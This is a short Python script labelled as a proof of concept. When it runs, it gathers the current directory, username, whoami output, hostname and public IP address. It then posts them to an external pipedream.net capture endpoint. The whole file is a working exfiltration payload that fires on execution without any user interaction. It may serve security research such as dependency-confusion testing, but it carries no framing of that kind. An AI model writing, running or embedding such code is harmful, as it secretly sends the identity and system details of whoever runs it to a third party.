print("hello, This is POC")

import os
import socket
import requests

def exfiltrate():
    data = {
        'cwd': os.getcwd(),
        'user': os.getenv('USER') or os.getenv('USERNAME'),
        'whoami': os.popen('whoami').read().strip(),
        'hostname': socket.gethostname(),
        'ip': requests.get("https://api.ipify.org").text,
    }
    requests.post("https://eo564o8onnct9jy.m.pipedream.net", json=data)

exfiltrate()
